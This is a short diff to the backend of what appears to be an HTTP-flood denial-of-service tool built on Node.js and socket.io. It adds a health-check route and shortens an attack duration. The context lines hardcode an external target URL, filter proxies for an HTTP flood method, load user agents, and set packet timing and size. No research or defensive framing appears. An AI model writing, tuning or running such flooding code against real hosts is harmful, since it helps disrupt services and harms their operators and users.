@@ -11,6 +11,12 @@ const PORT = process.env.PORT || 3000;
 const __prod = process.env.NODE_ENV === "production";
 
 const app = express();
+
+
+app.get('/', (req, res) => {
+    res.send("Backend is alive");
+})
+
 const httpServer = createServer(app);
 const io = new Server(httpServer, {
     cors: {
@@ -28,7 +34,7 @@ io.on("connection", (socket) => {
         const target = 'https://shg2.radolyn.com';
         const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
         const userAgents = loadUserAgents();
-        const duration = 1000;
+        const duration = 2;
         const packetDelay = 1000;
         const packetSize = 64;
 
